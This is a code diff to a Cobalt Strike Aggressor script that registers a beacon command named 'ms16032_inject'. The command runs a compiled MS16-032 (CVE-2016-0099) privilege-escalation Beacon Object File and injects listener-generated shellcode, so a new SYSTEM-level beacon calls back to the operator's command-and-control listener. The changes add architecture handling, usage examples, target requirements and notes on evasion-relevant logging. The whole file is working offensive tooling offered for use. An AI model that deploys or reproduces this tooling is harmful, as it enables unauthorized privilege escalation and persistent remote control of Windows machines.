@@ -1,11 +1,13 @@
-# MS16-032 BOF with direct beacon injection
+# MS16-032 Beacon Object File with Direct Beacon Injection
+# Exploits CVE-2016-0099 to gain SYSTEM privileges and inject beacon shellcode
 
 alias ms16032_inject {
-    local('$barch $handle $data $args $listener $payload $shellcode');
+    local('$barch $handle $data $args $listener $payload');
     
     # Check if listener was specified
     if(size(@_) < 2) {
         berror($1, "Usage: ms16032_inject <listener>");
+        berror($1, "Example: ms16032_inject http_listener");
         return;
     }
     
@@ -24,26 +26,33 @@ alias ms16032_inject {
     
     if(strlen($payload) == 0) {
         berror($1, "Failed to generate payload for listener: $listener");
+        berror($1, "Make sure the listener exists and is active");
         return;
     }
     
-    blog($1, "Generated " . strlen($payload) . " bytes of shellcode for $listener");
+    blog($1, "Generated " . strlen($payload) . " bytes of shellcode for $listener (arch: $barch)");
     
-    # Read the BOF file
-    $handle = openf(script_resource("ms16032_inject. $+ $barch $+ .o"));
+    # Read the appropriate BOF file
+    if($barch eq "x64") {
+        $handle = openf(script_resource("ms16032_inject.x64.o"));
+    }
+    else {
+        $handle = openf(script_resource("ms16032_inject.x86.o"));
+    }
+    
     $data = readb($handle, -1);
     closef($handle);
     
     if(strlen($data) == 0) {
-        berror($1, "Could not read ms16032_inject. $+ $barch $+ .o");
+        berror($1, "Could not read ms16032_inject.$barch.o - make sure the compiled BOF file is in the same directory as this script");
         return;
     }
     
-    # Pack arguments - shellcode as binary data
+    # Pack the shellcode as binary data
     $args = bof_pack($1, "b", $payload);
     
     # Execute BOF
-    btask($1, "Tasked beacon to run MS16-032 with beacon injection (listener: $listener)");
+    btask($1, "Tasked beacon to run MS16-032 with beacon injection (listener: $listener, arch: $barch)");
     beacon_inline_execute($1, $data, "go", $args);
 }
 
@@ -51,6 +60,18 @@ beacon_command_register(
     "ms16032_inject",
     "MS16-032 local privilege escalation with beacon injection",
     "Usage: ms16032_inject <listener>\n\n" .
-    "Exploits MS16-032 and injects a new beacon running as SYSTEM.\n" .
+    "Exploits MS16-032 (CVE-2016-0099) to gain SYSTEM privileges and inject a new beacon.\n" .
     "The shellcode is generated automatically for the specified listener.\n\n" .
-    "Example: ms16032_inject http_listener");
+    "Examples:\n" .
+    "  ms16032_inject http_listener\n" .
+    "  ms16032_inject https_listener\n" .
+    "  ms16032_inject smb_listener\n\n" .
+    "Requirements:\n" .
+    "  - Target must be unpatched (pre-March 2016)\n" .
+    "  - Windows 7, 8, 10, Server 2008, 2012, or 2012 R2\n" .
+    "  - Low-privilege context (any user)\n\n" .
+    "Notes:\n" .
+    "  - This exploit uses a race condition in Secondary Logon Service\n" .
+    "  - Process creation may generate event logs\n" .
+    "  - The elevated beacon should check in automatically"
+);
